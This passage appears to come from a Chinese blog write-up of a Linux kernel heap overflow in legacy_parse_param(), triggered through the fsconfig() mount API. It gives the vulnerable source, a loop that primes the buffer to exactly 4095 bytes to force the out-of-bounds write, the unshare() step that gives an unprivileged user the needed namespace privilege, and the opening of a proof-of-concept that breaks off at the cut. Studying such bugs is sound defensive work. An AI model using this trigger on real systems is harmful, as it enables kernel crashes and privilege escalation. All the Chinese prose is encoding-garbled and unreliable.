<code>move_mount()</code> ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ç”¨ä»¥å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨ï¼š</p><ul><li>å¯¹äºå°šæœªè¿›è¡ŒæŒ‚è½½çš„æŒ‚è½½å®ä¾‹è€Œè¨€ï¼Œè¿›è¡ŒæŒ‚è½½çš„æ“ä½œä¾¿æ˜¯ä»ç©ºæŒ‚è½½ç‚¹ <code>&quot;&quot;</code> ç§»åŠ¨åˆ°å¯¹åº”çš„æŒ‚è½½ç‚¹ï¼ˆä¾‹å¦‚ <code>&quot;/mnt/temp&quot;</code>ï¼‰ï¼Œæ­¤æ—¶æˆ‘ä»¬å¹¶ä¸éœ€è¦ç»™å‡ºç›®çš„æŒ‚è½½ç‚¹çš„ fdï¼Œè€Œå¯ä»¥ä½¿ç”¨ <code>AT_FDCWD</code></li></ul><p>å¼•å…¥äº† <code>move_mount()</code> ä¹‹åï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ä¸€ä¸ªç”¨ä»¥å°† <code>&quot;/dev/sdb1&quot;</code> ä»¥ <code>&quot;ext4&quot;</code> æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ° <code>&quot;/mnt/temp&quot;</code> çš„å®Œæ•´ç¤ºä¾‹ç¨‹åºå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_move_mount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_move_mount 429</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">move_mount</span><span class="hljs-params">(<span class="hljs-type">int</span> from_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *from_pathname,<span class="hljs-type">int</span> to_dfd, </span><br><span class="hljs-params">               <span class="hljs-type">const</span> <span class="hljs-type">char</span> *to_pathname, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_move_mount, from_dfd, from_pathname, to_dfd, to_pathname, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br>    move_mount(mount_fd, <span class="hljs-string">&quot;&quot;</span>, AT_FDCWD, <span class="hljs-string">&quot;/mnt/temp&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸€å¥—æµç¨‹ä¸‹æ¥ä¾¿æ˜¯ new Filesystem mount API çš„åŸºæœ¬ç”¨æ³•</p><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01.æ¼æ´åˆ†æ"></a>0x01.æ¼æ´åˆ†æ</h1><h2 id="legacy-parse-param-æ•´å‹æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œæ‹·è´"><a href="#legacy-parse-param-æ•´å‹æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œæ‹·è´" class="headerlink" title="legacy_parse_param() - æ•´å‹æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œæ‹·è´"></a>legacy_parse_param() - æ•´å‹æº¢å‡ºå¯¼è‡´çš„è¶Šç•Œæ‹·è´</h2><p>å‰é¢æˆ‘ä»¬æåˆ°è¯¥æ¼æ´å‘ç”Ÿäº <code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨ä¸­ï¼Œè‹¥æˆ‘ä»¬ç»™çš„ <code>cmd</code> ä¸º <code>FSCONFIG_SET_STRING</code>ï¼Œåˆ™åœ¨å†…æ ¸ä¸­å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">fsconfig</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_fsconfig_locked</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_parse_fs_param</span>()</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>vfs_parse_fs_param()</code> ä¸­ä¼šè°ƒç”¨ <code>fs_context-&gt;ops-&gt;parse_param</code> å‡½æ•°æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vfs_parse_fs_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;<br>ret = fc-&gt;ops-&gt;parse_param(fc, param);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‰é¢æˆ‘ä»¬è®²åˆ°å¯¹äºæœªè®¾ç½® <code>init_fs_context</code> çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹è€Œè¨€å…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>legacy_init_fs_context()</code> è¿›è¡Œåˆå§‹åŒ–ï¼Œå…¶ä¸­ <code>fs_context</code> çš„å‡½æ•°è¡¨ä¼šè¢«è®¾ç½®ä¸º <code>legacy_fs_context_ops</code>ï¼Œå…¶ <code>parse_param</code> æŒ‡é’ˆå¯¹åº”ä¸º <code>legacy_parse_param()</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> <span class="hljs-title">legacy_fs_context_ops</span> =</span> &#123;<br>.<span class="hljs-built_in">free</span>= legacy_fs_context_free,<br>.dup= legacy_fs_context_dup,<br>.parse_param= legacy_parse_param,<br>.parse_monolithic= legacy_parse_monolithic,<br>.get_tree= legacy_get_tree,<br>.reconfigure= legacy_reconfigure,<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ¼æ´ä¾¿å‘ç”Ÿåœ¨è¯¥å‡½æ•°ä¸­ï¼Œåœ¨è®¡ç®— <code>len &gt; PAGE_SIZE - 2 - size</code> æ—¶ï¼Œç”±äº size ä¸º <code>unsigned int</code> ï¼Œè‹¥ <code>size + 2 &gt; PAGE_SIZE</code> ï¼Œåˆ™ <code>PAGE_SIZE - 2 - size</code> çš„ç»“æœ<strong>ä¼šä¸‹æº¢ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ— ç¬¦å·å€¼ï¼Œä»è€Œç»•è¿‡ len çš„æ£€æŸ¥</strong>ï¼Œè¿™é‡Œçš„ size æ¥æºä¸º <code>ctx-&gt;data_size</code>ï¼Œå³<strong>å·²æ‹·è´çš„æ€»çš„æ•°æ®é•¿åº¦</strong>ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Add a parameter to a legacy config.  We build up a comma-separated list of</span><br><span class="hljs-comment"> * options.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> *<span class="hljs-title">ctx</span> =</span> fc-&gt;fs_private;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size = ctx-&gt;data_size; <span class="hljs-comment">// å·²æ‹·è´çš„æ•°æ®é•¿åº¦</span><br><span class="hljs-type">size_t</span> len = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Non-string source&quot;</span>);<br><span class="hljs-keyword">if</span> (fc-&gt;source)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Multiple sources&quot;</span>);<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);<br><br><span class="hljs-comment">// è®¡ç®— len</span><br><span class="hljs-keyword">switch</span> (param-&gt;type) &#123;<br><span class="hljs-keyword">case</span> fs_value_is_string:<span class="hljs-comment">// å¯¹åº” FSCONFIG_SET_STRING</span><br>len = <span class="hljs-number">1</span> + param-&gt;size;<br><span class="hljs-comment">/* Fall through */</span><br><span class="hljs-keyword">case</span> fs_value_is_flag:<br>len += <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,<br>      param-&gt;key);<br>&#125;<br><br><span class="hljs-comment">// æ­¤å¤„å­˜åœ¨æ•´å‹æº¢å‡ºçš„æ¼æ´ï¼Œè‹¥ size + 2 å¤§äºä¸€å¼ é¡µçš„å¤§å°åˆ™ä¼šä¸Šæº¢ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ— ç¬¦å·æ•´å‹ï¼Œ</span><br><span class="hljs-comment">// å¯¼è‡´æ­¤å¤„é€šè¿‡æ£€æŸ¥ï¼Œä»è€Œå¯¼è‡´åç»­æ­¥éª¤ä¸­çš„è¶Šç•Œæ‹·è´</span><br><span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br>    (param-&gt;type == fs_value_is_string &amp;&amp;<br>     <span class="hljs-built_in">memchr</span>(param-&gt;<span class="hljs-built_in">string</span>, <span class="hljs-string">&#x27;,&#x27;</span>, param-&gt;size)))<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,<br>      param-&gt;key);<br></code></pre></td></tr></table></figure><p>åœ¨åé¢çš„æµç¨‹ä¸­ä¼šä»ç”¨æˆ·æ§ä»¶å°†æ•°æ®æ‹·è´åˆ°  <code>ctx-&gt;legacy_data</code>  ä¸Šï¼Œè€Œ <code>ctx-&gt;legacy_data</code> ä»…åˆ†é…äº†ä¸€å¼ é¡µé¢å¤§å°ï¼Œä½†åç»­æµç¨‹ä¸­çš„æ‹·è´æ˜¯ä» <code>ctx-&gt;legacy_data[size]</code> å¼€å§‹çš„ï¼Œ<strong>ç”±äº size å¯ä»¥å¤§äºä¸€å¼ é¡µå¤§å°ï¼Œå› æ­¤æ­¤å¤„å¯ä»¥å‘ç”Ÿæ•°æ®æ•°æ®å†™å…¥</strong>ï¼Œç”±äº <code>ctx-&gt;legacy_data</code> åœ¨åˆ†é…æ—¶ä½¿ç”¨çš„æ˜¯é€šç”¨çš„åˆ†é… flag <code>GFP_KERNEL</code>ï¼Œå› æ­¤å¯ä»¥æº¢å‡ºåˆ°ç»å¤§å¤šæ•°çš„å¸¸ç”¨ç»“æ„ä½“ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ä¸º legacy_data åˆ†é…ä¸€å¼ é¡µçš„å¤§å°</span><br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data) &#123;<br>ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;,&#x27;</span>;<br>len = <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-comment">// size å¯ä»¥å¤§äºä¸€å¼ é¡µï¼Œä½†æ˜¯ legacy_data åªæœ‰ä¸€å¼ é¡µï¼Œä»è€Œå¯¼è‡´äº†è¶Šç•Œæ‹·è´</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);<br>size += len;<br><span class="hljs-keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;<br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;=&#x27;</span>;<br><span class="hljs-comment">// size å¯ä»¥å¤§äºä¸€å¼ é¡µï¼Œä½†æ˜¯ legacy_data åªæœ‰ä¸€å¼ é¡µï¼Œä»è€Œå¯¼è‡´äº†è¶Šç•Œæ‹·è´</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="hljs-built_in">string</span>, param-&gt;size);<br>size += param-&gt;size;<br>&#125;<br>ctx-&gt;legacy_data[size] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>ctx-&gt;data_size = size;<br>ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº fsconfig çš„é™åˆ¶ï¼Œæˆ‘ä»¬å•æ¬¡å†™å…¥çš„æœ€å¤§é•¿åº¦ä¸º 256 å­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¤šæ¬¡è°ƒç”¨ fsconfig ä»¥è®©å…¶é€æ¸é€¼è¿‘ <code>PAGE_SIZE</code>ï¼Œè€Œ <code>len &gt; PAGE_SIZE - 2 - size</code> çš„æ£€æŸ¥<strong>å¹¶éå®Œå…¨æ— æ•ˆ</strong>ï¼Œç”±äº size ä¸ºå·²æ‹·è´æ•°æ®é•¿åº¦è€Œ len ä¸ºå¾…æ‹·è´æ•°æ®é•¿åº¦ï¼Œå› æ­¤<strong>åªæœ‰å½“ size ç´¯åŠ åˆ° 4095 æ—¶æ‰ä¼šå‘ç”Ÿæ•´å‹æº¢å‡º</strong>ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨è¿›è¡Œæº¢å‡ºå‰éœ€è¦å¡å¥½å·²æ‹·è´æ•°æ®é•¿åº¦<strong>åˆšå¥½ä¸º <code>4095</code></strong></p><p>ç”±äº <code>legacy_parse_param()</code> ä¸­æ‹·è´çš„ç»“æœå½¢å¼ä¸º <code>&quot;,key=val&quot;</code>ï¼Œæ•…æˆ‘ä»¬æœ‰å¦‚ä¸‹è®¡ç®—å…¬å¼ï¼š</p><ul><li><code>å•æ¬¡æ‹·è´æ•°æ®é•¿åº¦ = len(key) + len(val) + 2</code></li></ul><p>ä¸‹é¢ç¬”è€…ç»™å‡ºä¸€ä¸ªç¬”è€…è‡ªå·±è®¡ç®—çš„ 4095ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment"> * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>&#125;<br>fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>ç”±äºå¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹éƒ½æœªè®¾ç½® <code>init_fs_context</code>ï¼Œå› æ­¤æœ€åéƒ½å¯ä»¥èµ°åˆ° <code>legacy_parse_param()</code> çš„æµç¨‹å½“ä¸­ï¼Œä¾‹å¦‚ <code>ext4</code> æ–‡ä»¶ç³»ç»Ÿçš„ <code>file_system_type</code> å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> <span class="hljs-title">ext4_fs_type</span> =</span> &#123;<br>.owner= THIS_MODULE,<br>.name= <span class="hljs-string">&quot;ext4&quot;</span>,<br>.mount= ext4_mount,<br>.kill_sb= kill_block_super,<br>.fs_flags= FS_REQUIRES_DEV,<br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å°†é€šè¿‡ ext4 æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œæ¼æ´å¤ç°ï¼Œæˆ‘ä»¬åªéœ€è¦è¶Šç•Œå†™è¶³å¤Ÿé•¿çš„ä¸€å—å†…å­˜ï¼Œé€šå¸¸éƒ½èƒ½å†™åˆ°ä¸€äº›å†…æ ¸ç»“æ„ä½“ä»è€Œå¯¼è‡´ kernel panic</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ filesystem mount API éœ€è¦å‘½åç©ºé—´å…·æœ‰  <code>CAP_SYS_ADMIN</code> æƒé™ï¼Œä½†ç”±äºå…¶<strong>ä»…æ£€æŸ¥å‘½åç©ºé—´æƒé™</strong>ï¼Œæ•…å¯¹äºæ²¡æœ‰è¯¥æƒé™çš„ç”¨æˆ·åˆ™å¯ä»¥é€šè¿‡ <code>unshare(CLONE_NEWNS|CLONE_NEWUSER)</code> åˆ›å»ºæ–°çš„å‘½åç©ºé—´ï¼Œä»¥åœ¨æ–°çš„å‘½åç©ºé—´å†…è·å–å¯¹åº”æƒé™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span 